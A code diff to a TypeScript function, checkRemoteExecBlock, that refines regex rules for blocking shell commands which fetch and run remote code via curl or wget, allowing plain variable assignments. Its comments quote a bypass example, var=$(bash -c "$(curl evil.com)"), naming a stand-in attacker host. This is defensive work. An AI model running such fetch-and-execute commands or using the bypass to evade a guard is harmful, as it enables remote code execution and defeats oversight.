@@ -87,9 +87,29 @@ export function checkRemoteExecBlock(cmdLower: string): EnforcementResult {
       /(?:^|[\s;&|])\.\s+<\(\s*\b(curl|wget)\b/.test(cmdForExecCheck)) {
     return { block: true, reason: remoteExecReason };
   }
-  if (/\$\(\s*\b(curl|wget)\b/.test(cmdForExecCheck) || /`\s*(curl|wget)\b/.test(cmdForExecCheck) ||
-      /\beval\b.*\b(curl|wget)\b/.test(cmdForExecCheck)) {
+  // Block eval with curl/wget — always dangerous
+  if (/\beval\b.*\b(curl|wget)\b/.test(cmdForExecCheck)) {
     return { block: true, reason: remoteExecReason };
+  }
+  // Block $(curl ...) and `curl ...` UNLESS every occurrence is a safe shell variable assignment.
+  // Safe: VAR=$(curl ...), export VAR=$(curl ...), local VAR=`curl ...`
+  // Unsafe: bare $(curl), --flag=$(curl), echo =$(curl), env VAR=$(curl) cmd
+  if (/\$\(\s*\b(curl|wget)\b/.test(cmdForExecCheck) || /`\s*\b(curl|wget)\b/.test(cmdForExecCheck)) {
+    // Block env VAR=$(curl ...) cmd — env runs a command with the var, so curl output could influence execution
+    // Note: [a-z_] without /i is fine — cmdLower (the parameter) is already lowercased
+    if (/\benv\s+.*[a-z_]\w*=(?:\$\(|`).*\b(curl|wget)\b/.test(cmdForExecCheck)) {
+      return { block: true, reason: remoteExecReason };
+    }
+    // Strip all safe assignment patterns, then check if any $(curl)/`curl` remain.
+    // Use negative lookahead (?!\$\() to reject nested $() inside the stripped content —
+    // prevents bypass via var=$(bash -c "$(curl evil.com)")
+    // Note: [^)] stops at first unescaped ) — safe because residual is rechecked for
+    // $(curl)/`curl` patterns specifically, not bare 'curl' words
+    const safeAssignment = /(?:^|[\s;&|])(?:export\s+|declare\s+|local\s+|readonly\s+|typeset\s+)?[a-z_]\w*=(?:\$\((?:(?!\$\()[^)])*\)|`(?:(?!\$\()[^`])*`)/gi;
+    const stripped = cmdForExecCheck.replace(safeAssignment, " ");
+    if (/\$\(\s*\b(curl|wget)\b/.test(stripped) || /`\s*\b(curl|wget)\b/.test(stripped)) {
+      return { block: true, reason: remoteExecReason };
+    }
   }
   return undefined;
 }
